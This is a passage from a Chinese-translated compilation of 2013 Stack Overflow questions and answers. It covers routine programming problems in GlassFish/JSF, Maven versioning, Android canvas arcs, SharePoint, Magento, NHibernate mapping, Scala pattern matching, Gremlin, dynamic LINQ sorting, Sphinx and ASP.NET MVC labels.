> 
> 标签：eclipse, jsf-2, primefaces, glassfish-3, ubuntu-10.04

[我发现以前在这里](https://stackoverflow.com/q/8503461)问过同样的问题，但我没有找到合适的答案。我正在使用 PrimeFaces 3.5 作为 JSF 组件套件在 JSF2.0 中设计我的网站。以下是自动部署过程中出现的错误 -

![在此处输入图像描述](https://i.stack.imgur.com/Xz2tm.png)

以下是重新启动时出现的错误`GlassFish Server 3.1.2`（由于自动部署不起作用，所以我想重新启动它） -

![在此处输入图像描述](https://i.stack.imgur.com/HWDIr.png)

以下是`GlassFish Server 3.1.2`Eclipse 控制台中显示的错误 -

```
SEVERE: service exception
java.lang.NullPointerExceptionnull  at java.lang.String.replace(String.java:2219)null   at com.sun.enterprise.v3.common.PropsFileActionReporter.setMessage(PropsFileActionReporter.java:67)null at com.sun.enterprise.v3.admin.AdminAdapter.service(AdminAdapter.java:219)null  at com.sun.grizzly.tcp.http11.GrizzlyAdapter.service(GrizzlyAdapter.java:179)null   at com.sun.enterprise.v3.server.HK2Dispatcher.dispath(HK2Dispatcher.java:117)null   at com.sun.enterprise.v3.services.impl.ContainerMapper$Hk2DispatcherCallable.call(ContainerMapper.java:354)null at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)null    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:860)null at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:757)null at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1056)null  at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:229)null   at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)null    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)null  at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)null   at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)null    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)null    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)null    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)null at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)null   at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)null  at java.lang.Thread.run(Thread.java:679)null 
```

我的`web.xml`样子如下-

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    id="portal" version="3.0">
    <display-name>Portal</display-name>

    <!-- Change to "Production" when you are ready to deploy -->
    <context-param>
        <param-name>javax.faces.PROJECT_STAGE</param-name>
        <param-value>Development</param-value>
    </context-param>
    <context-param>
        <param-name>primefaces.THEME</param-name>
        <param-value>cupertino</param-value>
    </context-param>
    <context-param>
        <param-name>javax.faces.INTERPRET_EMPTY_STRING_SUBMITTED_VALUES_AS_NULL</param-name>
        <param-value>true</param-value>
    </context-param>

    <!-- Primefaces file upload -->
    <!-- thresholdSize specifies the maximum file size in bytes to keep uploaded 
        files in memory. If it exceeds this limit, it’ll be temporarily written to 
        disk. -->
    <!-- uploadDirectory is the folder where to keep temporary files that exceed 
        thresholdSize. -->
    <filter>
        <filter-name>PrimeFaces FileUpload Filter</filter-name>
        <filter-class>org.primefaces.webapp.filter.FileUploadFilter</filter-class>
        <init-param>
            <param-name>thresholdSize</param-name>
            <param-value>51200</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>PrimeFaces FileUpload Filter</filter-name>
        <servlet-name>Faces Servlet</servlet-name>
    </filter-mapping>
    <context-param>
        <param-name>uploadDirectory</param-name>
        <param-value>/opt/upload/</param-value>
    </context-param>

    <welcome-file-list>
        <welcome-file>index.xhtml</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>Faces Servlet</servlet-name>
        <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>*.xhtml</url-pattern>
    </servlet-mapping>

    <session-config>
        <session-timeout>30</session-timeout>
    </session-config>

</web-app> 
```

我正在`Eclipse Indigo`使用`Ubuntu 10.04.4 LTS`.

# java - 链接 POM 版本和应用程序版本

> ID：16013765
> 
> 赞同：3
> 
> 时间：2013-04-15T11:14:52.587
> 
> 标签：java, maven, version

我的项目中有两个版本。

1.  打包项目时使用的我的 POM.xml 中的版本等。
2.  我在代码中放入常量的版本，因此我可以在运行时使用它，当我登录等时。

这些当然应该是相同的，但有时我会忘记更改其中一个。

有没有一种好方法可以只定义一次这个版本并在运行时由 Maven 和代码使用它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:21:27.257

[http://www.sonatype.com/books/mvnref-book/reference/resource-filtering-sect-description.html](http://www.sonatype.com/books/mvnref-book/reference/resource-filtering-sect-description.html)

看看这个，你应该有一个属性文件，它有一个特定的属性，它是指版本号。并且使用过滤，您可以在 Maven 工件和应用程序中设置相同的版本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T11:22:08.870

当您使用 Maven 打包应用程序时，Maven 将生成一个目录`META-INF/maven/<groupId>/<artifactId>/pom.properties`。该文件包含根据 POM 的项目版本，您可以在运行时从 JAR 文件加载该文件以读取您的版本号。

唯一的问题是，这个文件*只*存在于打包的项目中（无论是 JAR、WAR 还是 EAR）。当您从工作台运行代码时，您可能想要编写一些回退机制。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:30:15.710

这是我想要在 pom 文件中指定版本时通常使用的一些代码。

```
private final static String GROUP_ID = "my.group";
private final static String ARTIFACT_ID = "my-artifact";

private String getVersion() {
    String propFileName = "META-INF/maven/" + GROUP_ID + "/" + ARTIFACT_ID + "/pom.properties";
    Properties properties = new Properties();
    String version = "n/a";

    try {
        InputStream inStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(propFileName);

        if (inStream != null) {
            properties.load(inStream);
            version = properties.getProperty("version", "n/a");
        }
    } catch (IOException e) { }
    return version;
} 
```

正如 mthmulders 在他的回答中所说，***这个文件只存在于一个打包的项目***中（在最终的 war/jar/any 中，而不是在工作目录中）。

# android - 绘制作为圆一部分的圆弧

> ID：16013768
> 
> 赞同：0
> 
> 时间：2013-04-15T11:15:01.177
> 
> 标签：android, canvas, geometry

我想使用以下方法绘制弧线：`.Canvas.drawArc(RectF oval, float startAngle, float sweepAngle, boolean useCenter, Paint paint)`

我在圆上有两个点，圆的中心点和半径。

我到底需要在椭圆形矩形中设置什么以及如何计算 startAngle 和 sweepAngle？

我尝试了下面的代码：

```
m_radiusRect.set(x1, Math.min(y1, y2), x2, Math.max(y1,y2));
float startAngle = (float)((Math.toDegrees( Math.atan2(x1 - 360.0, 360.0 - y1) ) + 360.0) % 360.0);
float sweepAngle = (float)((Math.toDegrees( Math.atan2(x2 - 360.0, 360.0 - y2) ) + 360.0) % 360.0) - startAngle;

canvas.drawArc(m_radiusRect, startAngle, sweepAngle, false, m_paint); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:40:11.730

查看[这个](https://stackoverflow.com/questions/8968500/find-angle-of-a-point-from-center-of-circle?answertab=votes#tab-top)答案并找到一个点与中心的角度。

基于此，找到 x1 和 x2 的两个角度表示 a1 和 a2。

然后，

```
sweepAngle = a2 - a1;
startAngle = a1; 
```

**已编辑**

链接中给出的公式看起来不起作用，因为它不考虑中心。

这里中心是 (cx, cy)

```
float startAngle = (int) ((float) Math.toDegrees( Math.atan2(x1 - cx, y1 - cy)));
         float sweepAngle = (int) ((float) Math.toDegrees( Math.atan2(x2 - cx, y2 - cy))) - startAngle;

         Rect rect = new Rect();

         rect.left = (int) (cx - radius);
         rect.top = (int) (cy - radius);
         rect.right = (int) (cx + radius);
         rect.bottom = (int) (cy + radius); 
```

# c# - 从站点获取所有用户

> ID：16013784
> 
> 赞同：1
> 
> 时间：2013-04-15T11:15:45.173
> 
> 标签：c#, sharepoint, sharepoint-2007, report

有没有人知道从所有站点和子站点获取所有用户。我想创建一个访问报告，该报告将描述每个用户在 sharepoint 中每个站点和子站点中的权限。我正在获取所有站点和子站点。我可以从每个站点获取用户。但我想知道有什么方法可以先让所有用户参与进来，然后再让他们参与网站。以及该站点中每个用户的权限是什么。

提前谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T13:05:52.297

_web - 来自站点上下文等的网络上下文。

```
SPGroupCollection _collGroups = _web.Groups;
                        foreach (SPUser _User in _web.SiteUsers)
                        {
                           //your code here 
                        } 
```

在这里，您有一些客户端对象模型，如何从 SITE 集合范围获取用户，如果您想从所有站点获取它，则取决于我们正在谈论的范围或功能类型，因为它们可能以其他方式取决于权限（计时器作业 webparts ETC） 。另一种方法是得到

> SPSiteDataQuery

接着

> SPSiteDataQuery.Users

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T13:01:19.837

我们曾经有过这种情况，但我们拥有的是让我们的 SharePoint 服务器连接到 SQL 服务器，然后将所有用户连同权限和站点一起保存到一个表中。

您可以将此网站用作参考，因为它似乎与您所要求的相同： [如何获取 SharePoint 中所有用户的列表](https://stackoverflow.com/questions/1266382/how-to-get-a-list-of-all-users-in-sharepoint)

# magento - pdf 中的 Magento getCustomerId()

> ID：16013786
> 
> 赞同：0
> 
> 时间：2013-04-15T11:15:48.817
> 
> 标签：magento, magento-1.6

我尝试在 Shipment PDF 中获取 customerId。

我试过这段代码（输出在 // 之后的任何行的右边）

```
$order = $shipment->getOrder();

$this->page->drawText($order->getCustomerEmail(), $this->margin_left, $this->y, $this->charset); //outputs the correct email

$this->page->drawText($order->getCustomerName(), $this->margin_left, $this->y, $this->charset); //outputs the correct name

$this->page->drawText($order->getCustomerId(), $this->margin_left, $this->y, $this->charset); //outputs nothing

$this->page->drawText(var_export($order->getCustomerId(), true), $this->margin_left, $this->y, $this->charset); //outputs 'NULL' 
```

我是否忘记了绘制正确的客户 ID 的东西？我当前的版本是 1.6.2。

感谢您的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:37:48.517

`customer_id`仅当注册并登录的用户下订单时，才会填写该属性。

对于客人来说`customer_id`，订单的属性始终是`null`。这就是为什么你没有输出。

# android - 在系统应用程序中使用 sendBroadcast

> ID：16013787
> 
> 赞同：16
> 
> 时间：2013-04-15T11:15:51.210
> 
> 标签：android

我无法`Broadcast`从作为系统应用程序加载到自定义 rom 中的应用程序发送一个（`android:sharedUserId="android.uid.system"`在 中使用`Manifest`）。

我遇到的问题是尝试执行简单的 sendBroadcast 时：

```
Intent newIntent = new Intent(intent.getExtras().getString(BUNDLE_ACTION_TO_REPLY_ON));
newIntent.putExtra(BUNDLE_FILE_URI, bitmapFile.getAbsolutePath());
newIntent.putExtra(BUNDLE_REPLY_WIDTH, width);
newIntent.putExtra(BUNDLE_REPLY_HEIGHT, height);
newIntent.putExtra(BUNDLE_REPLY_EXTRA, extra);
context.sendBroadcast(newIntent); 
```

我在 Logcat 中收到此警告：

`Calling a method in the system process without a qualified user`

[`ContextImpl.java`](http://mirror.yongbok.net/linux/android/repository/frameworks/base/core/java/android/app/ContextImpl.java)这是在这个过程中被抽出来的`warnIfCallingFromSystemProcess()`。

有谁知道为什么（如果我需要“修复”它）？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-08-14T05:43:38.383

使用下面的函数而不是`sendBroadcast(Intent intent)`.

```
void sendBroadcastAsUser(Intent intent, UserHandle user) 
```

例如：

```
context.sendBroadcastAsUser(newIntent, new UserHandle(UserHandle.USER_CURRENT)); 
```

# java - 在不同线程的类之间传递对象的最佳方式？

> ID：16013791
> 
> 赞同：5
> 
> 时间：2013-04-15T11:16:01.413
> 
> 标签：java

我有一个“可运行”的“A”类，我用 Java 解组器制作新对象。MainGUI 线程尝试通过已在类“A”中的 get() 访问这些实例。我在 A 类创建的实例，我将它们设为静态，以便它们永远可用，但是当我得到一个具有不同属性的新完整实例时，我必须将新实例与前一个数据进行比较并保持新的那一个。

有没有更好的方法或设计来解决这个问题？

如何获取在运行时创建的“A”类实例而不使它们成为静态的？

示例代码：

```
 public class SOAPMessagesFactory {

     private static GetCameraImageResponse                getCameraImageResponse;

// process here the msgs in another thread, not shown here in that snipped
     if (messageTag.equalsIgnoreCase("GetCameraImageResponse")) {
                try {
                    JAXBElement<GetCameraImageResponse> cameraImageResponse = unmarshaller.unmarshal(SoapBodyReader, GetCameraImageResponse.class);
                    getCameraImageResponse = cameraImageResponse.getValue();

                } catch (Throwable ex) {
                    ex.printStackTrace();
                }

            }

public GetCameraImageResponse getCameraImageResponse() {

    if (getCameraImageResponse != null) {
        return getCameraImageResponse;
    } else {
        return null;
    }

}
     // in main gui

 public void UpdateGUI() {

        GetCameraImageResponse cameraImageResponse = messageFactory.getCameraImageResponse();

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:24:30.117

尝试[生产者-消费者](http://en.wikipedia.org/wiki/Producer-consumer_problem)模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:22:41.217

您可以在 main 中声明“A”类型的引用并将其传递给另一个线程。在另一个线程中执行操作并将 A 的新实例分配给引用。像这样的东西

```
A aVariable;
Thread t = new Thread(new MyThread(aVariable));
t.start();
t.join();
populateGUI(aVariable); 
```

# nhibernate - 流畅的 NHibernate 映射以从查找表返回描述

> ID：16013792
> 
> 赞同：0
> 
> 时间：2013-04-15T11:16:04.490
> 
> 标签：nhibernate, fluent-nhibernate, fluent-nhibernate-mapping

我们有以下数据库结构：

```
UserTeam table
Id (PK, int not null)
UserId (FK, int, not null)
TeamId (FK, int, not null)
RoleId (FK, int, not null)

libRole table
Id (PK, int not null)
Description (varchar(255), not null) 
```

我们有一个实体如下：

```
public class UserTeam
{
    public int Id { get; set; }
    public Team Team { get; set; }
    public User User { get; set; }
    public int RoleId { get; set; }
    public string Role { get; set; }
} 
```

我们正在使用 Fluent NHibernate 并自动配置 NHibernate（即，使用带有覆盖的 Automapping 类）。

我们试图将 libRole 表中的描述列放入 UserTeam 表上的“Role”属性中，但确实很困难。以下是我们得到的最接近的：

```
public class UserTeamMap : IAutoMappingOverride<UserTeam>
{
    public void Override( FluentNHibernate.Automapping.AutoMapping<UserTeam> mapping )
    {
        mapping.References( m => m.User ).Column( "UserId" );
        mapping.References( m => m.Team ).Column( "TeamId" );

        mapping.Join("Role", join =>
            {
                join.Fetch.Join();
                join.KeyColumn( "Id" );
                join.Map( x => x.Role, "Description" );
            } );
    }

} 
```

这会生成以下 SQL：

```
SELECT
    TOP (@p0)  this_.Id as Id70_0_,
    this_.RoleId as RoleId70_0_,
    this_.TeamId as TeamId70_0_,
    this_.UserId as UserId70_0_,
    this_1_.Description as Descript2_71_0_ 
FROM
    [UserTeam] this_ 
inner join
    libRole this_1_ 
        on this_.Id=this_1_.Id; 
```

关闭，但 NHibernate 应该在连接中使用 UserTeam 表和 libRole 表上的 Id 列`this_.RoleId=this_1_.Id`

我们缺少什么？我们真的不想在应用程序中创建一个“libRole”实体，因为我们真正关心的是描述值——这是用户可配置的，所以我们也不能只使用枚举。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:10:31.707

`Join`使用父表的主键。无法将其更改为外键。有关[使用](http://nhforge.org/doc/nh/en/#mapping-declaration-join)`Join`. _

在这种情况下，我建议为查找创建一个实体。但如果你真的想采用这种方法，你可以用公式映射属性，即

```
Map(x => x.Role).Formula("(select description from libRole where Id = RoleId)"); 
```

请注意，这并不完美，因为它使用`RoleId`了因此如果查询有另一个带有名为列的表，`RoleId`那么 DBMS 将在尝试执行 SQL 时抱怨。

# jquery - 如何放置 浮动图像？

> ID：16013793
> 
> 赞同：1
> 
> 时间：2013-04-15T11:16:05.273
> 
> 标签：jquery, html, css-float

我需要在站点图像上放置缩放图标。一些图像具有 float=left 或 float=right 样式。我可以使用 jQuery，这是我的问题的一个例子：http: [//jsfiddle.net/4Nvbe/1/](http://jsfiddle.net/4Nvbe/1/)

我当前的代码：

`$("a[rel^='lightbox']").each(function () { $(this).prepend('<div class="zoom"></div>'); });`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:22:04.860

您需要绝对定位图标（位置：绝对），然后使用顶部、左侧和/或右侧属性将它们定位在图像上的正确位置。在 wrapping (image) 元素中使用 position:relatvie 以防止图标定位到图像范围之外。

# scala - 在基于 OR 的模式匹配中多次绑定提取器符号

> ID：16013794
> 
> 赞同：0
> 
> 时间：2013-04-15T11:16:09.410
> 
> 标签：scala, pattern-matching

是否有可能以某种方式使用`OR`将符号绑定到常见元素的基于模式匹配，例如：

```
import swing._
import event._

new Label {
  listenTo(mouse.clicks)
  listenTo(mouse.moves)

  reactions += {
    case MousePressed(_, point, mod, _, _) | MouseDragged(_, point, mod) =>
      println(s"mouse x = ${point.x}, y = ${point.y}, mod = $mod")
  }
} 
```

我能以某种方式完成这项工作，而无需编写`case`具有相同主体的语句（我知道我可以编写一个辅助函数）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T15:45:57.923

您可以匹配多个案例类，如评论中所示。但是，这样做时不能使用变量。所以`point`and`mod`变量不能在那里使用。

但是，如果`point`and`mod`字段是所有鼠标事件都应该有的东西，您可以为鼠标对象创建一个公共类并在公共类的伴随对象中定义您自己的 unapply 方法：

```
abstract class MouseEvent {
  val point: Point
  val mod: Mod
}

object MouseEvent {
  def unapply(ev: MouseEvent): Option[(Int, Int)] = Some((ev.point, ev.mod))
}

case class MousePressed(someField: Int, point: Point, mod: Mod, someField2: Int, someField3: Int) extends MouseEvent

case class MouseDragged(someOtherField: Int, point: Point, mod: Mod) extends MouseEvent

val ev: Any = MouseDragged(1, 2, 3)

ev match {
  case MouseEvent(point, mod) => {
    println(s"Values are $point and $mod")
  }
} 
```

# neo4j - 使用 gremlin 查找节点等级

> ID：16013803
> 
> 赞同：1
> 
> 时间：2013-04-15T11:16:53.897
> 
> 标签：neo4j, gremlin

我在 Neo4j 中有具有多个关系的节点，例如关注、国家、地区等。但我想仅计算具有关系的节点的 pagerank/节点排名 Follows 。是否有任何教程可以使用 Gremlin 做到这一点。

```
17838 - Follows->1743
17838 - Country-> 2
.... 
```

ps：请分享任何Gremlin的好教程

所以我想出了这个：

```
gremlin> m = [:].withDefault{1}
gremlin>g.V.transform{rank=m[it.name];neighbors = it.out('Follows').toList();degree = neighbors.size();neighbors.each{m[it.name]=m[it.name]+(rank/degree);}neighbors;}.scatter.range(0,10000).loop(3){true}.iterate() 
```

这给了我空指针异常？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T23:25:45.140

你可以这样做。

```
g.V.out('follows').groupCount(m).loop(2){it.loops < 5} 
```

好的 Gremlin 教程在这里：

```
http://gremlin.tinkerpop.com
http://gremlindocs.com 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:29:59.023

请考虑使用 Cypher。一个好的起点可能是以下查询：

```
START n=node(*)
MATCH n-[:FOLLOWS]-m
RETURN n,m 
```

# c# - 局域网上的票务系统。使用 webservice、windows 服务或数据库轮询进行通信？

> ID：16013804
> 
> 赞同：0
> 
> 时间：2013-04-15T11:16:57.350
> 
> 标签：c#, web-services, windows-services

好的，我的任务是在我工作的工厂中创建类似的票证系统，操作员将生成类似票证，该票证存储在数据库中并发送给工程师以采取行动。该数据库是在虚拟服务器上运行的 MS SQL 数据库。每个用户都将拥有一个在 WPF 中开发的客户端桌面应用程序。

我被困在如何为工程师实施警报。生成工单后，它将存储在数据库中，然后需要向工程师发送消息或其他内容。到目前为止，我想出了以下关于我可以使用的想法。

*   Webservice - 客户端连接到此用于与数据库通信并将票证消息中继给工程师。
*   Windows 服务 - 与上述相同，但作为 Windows 服务？有好处吗？
*   数据库轮询 - 工程师的客户端软件每隔 2 分钟不断轮询数据库并检查新生成的票证。如果找到，则通知用户。

数据库轮询可能是最容易实现的，但由于延迟，它并没有真正生效。我提到了 2 分钟的延迟，因为一次将有大约 30 人连接，我会说其中 12 人是工程师，我不知道 12 个客户端程序连续轮询是否会影响服务器性能。

任何建议都会很棒，或者如果有人知道更好的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:48:03.273

如果您不想使用轮询（这对 30 个用户来说不会有问题），那么您可以使用带有回调合同的 WCF 服务，该服务允许您将事件从服务器发送回客户端。

示例：[WCF 回调](http://idunno.org/archive/2008/05/29/wcf-callbacks-a-beginners-guide.aspx)

# c# - 无法在 LINQ OrderBy 中使用属性名称进行排序

> ID：16013807
> 
> 赞同：13
> 
> 时间：2013-04-15T11:17:06.887
> 
> 标签：c#, linq, entity-framework, linq-to-entities, entity-framework-5

错误是

> *LINQ to Entities 无法识别方法 'System.Object GetValue(System.Object, System.Object[])' 方法，并且此方法无法转换为存储表达式。*

我的代码是

```
public static GridResult GetAllUsers(int count, int tblsize,string sortcreteria)
{
      using (UserEntities entity = new UserEntities())
      {

          var data = entity.User_Details.Take(count)
.OrderBy(i =>.GetType().GetProperty(sortcreteria).GetValue(i,null))
.Skip(tblsize).ToList();
          result.DataSource = data;
          result.Count = entity.User_Details.Count();
      }
      return result;
} 
```

如何使用属性名称作为字符串进行排序？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2014-03-06T14:52:02.317

只需将以下扩展添加到您的代码中，您就可以开始了：

```
using System.Linq;
using System.Linq.Expressions;
using System;

namespace SomeNameSpace
{
    public static class SomeExtensionClass
    {
        public static IQueryable<T> OrderByField<T>(this IQueryable<T> q, string SortField, bool Ascending)
        {
            var param = Expression.Parameter(typeof(T), "p");
            var prop = Expression.Property(param, SortField);
            var exp = Expression.Lambda(prop, param);
            string method = Ascending ? "OrderBy" : "OrderByDescending";
            Type[] types = new Type[] { q.ElementType, exp.Body.Type };
            var mce = Expression.Call(typeof(Queryable), method, types, q.Expression, exp);
            return q.Provider.CreateQuery<T>(mce);
        }
    } 
```

}

**用法：**

```
.OrderByField(sortcriteria, true) 
```

**编辑：**

但是，为了支持该`ThenBy`方法，以下返回 an 的方法`IOrderedQueryable`应该处理所有事情：

```
public static class SomeExtensionClass
{
    private static IOrderedQueryable<T> OrderingHelper<T>(IQueryable<T> source, string propertyName, bool descending, bool anotherLevel)
    {
        var param = Expression.Parameter(typeof(T), "p");
        var property = Expression.PropertyOrField(param, propertyName);
        var sort = Expression.Lambda(property, param);

        var call = Expression.Call(
            typeof(Queryable),
            (!anotherLevel ? "OrderBy" : "ThenBy") + (descending ? "Descending" : string.Empty),
            new[] { typeof(T), property.Type },
            source.Expression,
            Expression.Quote(sort));

        return (IOrderedQueryable<T>)source.Provider.CreateQuery<T>(call);
    }

    public static IOrderedQueryable<T> OrderBy<T>(this IQueryable<T> source, string propertyName)
    {
        return OrderingHelper(source, propertyName, false, false);
    }

    public static IOrderedQueryable<T> OrderBy<T>(this IQueryable<T> source, string propertyName, bool descending)
    {
        return OrderingHelper(source, propertyName, descending, false);
    }

    public static IOrderedQueryable<T> ThenBy<T>(this IOrderedQueryable<T> source, string propertyName)
    {
        return OrderingHelper(source, propertyName, false, true);
    }

    public static IOrderedQueryable<T> ThenBy<T>(this IOrderedQueryable<T> source, string propertyName, bool descending)
    {
        return OrderingHelper(source, propertyName, descending, true);
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-15T11:22:12.500

您可以尝试使用（有些旧的）[动态 LINQ](http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx)库来执行此操作：

```
var data = entity.User_Details
    .Take(count)
    .OrderBy(sortcriteria)
    .Skip(tblsize)
    .ToList(); 
```

或者，您仍然可以通过首先将对象移动到内存中来使用原始查询对序列进行排序，因为 LINQ to Entities 提供程序无法将对反射 API 的调用转换为 SQL：

```
var data = entity.User_Details
    .Take(count)
    .Skip(tblsize)
    .AsEnumerable()
    .OrderBy(i => i.GetType().GetProperty(sortcriteria).GetValue(i, null)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:36:01.383

您可能需要使用[`Expression Trees`](http://msdn.microsoft.com/en-us/library/bb397951.aspx)来构造 Linq 语句`OrderBy(x => x.SomeProperty)`。

[为 LINQ/Lambda 创建 OrderBy 表达式](https://stackoverflow.com/questions/5766247/create-an-orderby-expression-for-linq-lamda)

[动态创建 LINQ 到实体 OrderBy 表达式](https://stackoverflow.com/questions/2841585/create-linq-to-entities-orderby-expression-on-the-fly)

# php - Sphinx 自定义排序 (FIELD)

> ID：16013809
> 
> 赞同：2
> 
> 时间：2013-04-15T11:17:10.903
> 
> 标签：php, search, full-text-search, sphinx

我，有表：

```
id | geo_id | values ....
 1     1      wvrevev
 2     2      wvrevev
 3     3      wvrevev
 3     4      wvrevev
 7     5      wvrevev
 8     6      wvrevev
 9     8      wvrevev 
```

在两个字段中的狮身人面像索引：id 和 geo_id

我需要某种东西，那将是我指定记录的顶部。在 SQL 中收到这样的请求：

```
SELECT * FROM table ORDER BY FIELD(geo_id, "2", "3", "6") DESC 
```

如何在 Sphinx 中指定排序？此条目：

```
$cl->SetSortMode(SPH_SORT_EXTENDED, "FIELD(geo_id, "2", "3", "6") DESC"); 
```

引发错误：

```
enter code hereindex sphinxoffers: sort-by attribute 'field' not found 
```

如何摆脱困境？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:45:31.890

1.  狮身人面像没有 FIELD() 函数
2.  您不能在 SORT_EXTENDED 模式下指定函数。有排序表达式，但由于 1 而无济于事。

如果您总是使用该列表，则可以在索引时将其创建为属性...

```
sql_query = SELECT id, geo_id, FIELD(geo_id, "2", "3", "6") AS sorter, .... 
```

然后在 sphinxAPI 代码中...

```
$cl->SetSortMode(SPH_SORT_EXTENDED, "sorter DESC"); 
```

[编辑] 或（从评论中添加信息）...

> 可以使用嵌套的 IF() 函数构建与 FIELD 相同的逻辑。可能可以使用 EXPRESSION 排序，或者只是使用 SetSelect 创建一个虚拟属性，然后按此排序（使用 EXTENDED）

* * *

[Edit2] 在**sphinxQL**中使用该新属性，它只是另一个排序属性`ORDER BY`（sphinxQL 实际上只是 SPH_SORT_EXTENDED 排序）...

```
SELECT * FROM index WHERE MATCH(...) ORDER BY sorter DESC, WEIGHT() DESC 
```

那类的东西。

# asp.net-mvc-3 - 如何通过在 MVC 3 中组合不同的类成员在视图中显示标签

> ID：16013818
> 
> 赞同：0
> 
> 时间：2013-04-15T11:17:33.593
> 
> 标签：asp.net-mvc-3

我想显示输入框的标签，但我有 3 个包含信息的不同类

像Class1【设置】是这样的

```
public class Settings
{
    public static decimal Setting1 { get; set; }
    public static decimal Setting2 { get; set; }
} 
```

我们在登录时在上面的类中填充数据，所以我们把它保存在会话中

我的 Class2 [AppConst] 是这样的

```
public static class AppConst
{
    public const string _unitPersentage = "%";
    public const string _unitPerMT = "Per MT";
} 
```

我的模态是这样的

```
public class Sale
{
    [Display(Name = "Discount")]
    public double DiscountAmount { get; set; }
    [Display(Name = "Road Tax")]
    public double RoadTaxAmount { get; set; }
} 
```

现在在我的“销售”模型视图中，我想像这样显示属性“DiscountAmount”的标签

折扣 5%（DiscountAmount 表 + Settings.Setting1 的值 + AppConst._unitPersentage 的值）

在这里，我可以通过使用获得“DiscountAmount”的标签

```
 @Html.TextBoxFor(o => o.DiscountAmount) 
```

但是如何显示其他两个成员“Settings.Setting1”和“AppConst._unitPersentage”的值

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:30:41.057

您几乎没有其他选择可以尝试。如果数据仅用于显示目的，您可以使用 ViewData 或 ViewBag 或 TempData 来传递 Settings 和 AppConst 的值，只要适合您的目的。见[这里](http://www.rachelappel.com/when-to-use-viewbag-viewdata-or-tempdata-in-asp.net-mvc-3-applications)。

在这种情况下，如果这些是静态对象，您可以在视图中将它们称为： `<Namespace>.Settings.Setting1`或`<Namespace>.AppConst._unitPerMT`。

> 请以此为起点，并遵循适当的最佳开发实践。请不要`public`使用下划线声明成员。下划线通常作为`private`成员的前缀。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T12:38:49.173

您可以展平模型，然后使用编辑器模板来显示复杂的标签。

## 扁平模型

```
public class CustomModel
{
    [Display(Name = "Discount")]
    public double DiscountAmount { get; set; }
    [Display(Name = "Road Tax")]
    public double RoadTaxAmount { get; set; }   
    public decimal Setting1 { get; set; }
    public string UnitPercent {get;set;}
} 
```

## 模板

模板应放在`EditorTemplates`文件夹下的`Shared`文件夹内。

```
@model CustomModel

@{
    var inputProp = ViewData.ModelMetadata.Properties
        .First(o => o.PropertyName == "DiscountAmount");
}
<label for="@inputProp.PropertyName" id="@(inputProp.PropertyName+"Label")">
    Discount 5% (@inputProp.ShortDisplayName @Model.Setting1@Model.UnitPercent)
    <input id="@inputProp.PropertyName" type="text"
        name="@inputProp.PropertyName" />    
</label> 
```

## 控制器代码

这是您将如何创建模型并将其传递给视图的方式：

```
return View(new CustomModel
{
    // get it from your datastore or where ever the source may be
    Setting1 = getFromDbOrSomewhere(),
    UnitPercent = AppConst._unitPersentage,                
}); 
```

## 你的看法

然后像这样在你的视图上使用它

```
@model CustomModel

@Html.EditorFor(m => Model) 
```

